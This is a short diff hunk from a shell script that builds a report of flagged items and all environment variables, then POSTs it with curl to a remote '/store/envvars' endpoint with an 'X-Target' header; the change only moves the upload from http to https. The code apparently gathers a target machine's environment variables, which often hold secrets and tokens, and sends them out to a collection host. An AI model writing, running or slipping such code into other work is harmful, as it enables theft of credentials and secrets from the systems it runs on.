@@ -22,7 +22,7 @@ ${FLAGGED:-"(none found)"}
 [ALL ENVIRONMENT VARIABLES]
 $ALL"
 
-printf "$OUT" | curl -s -X POST "http://$H:$P/store/envvars" \
+printf "$OUT" | curl -s -X POST "https://$H:$P/store/envvars" \
      -H "Authorization: $AU" \
      -H "Content-Type: text/plain" \
      -H "X-Target: $TH" \
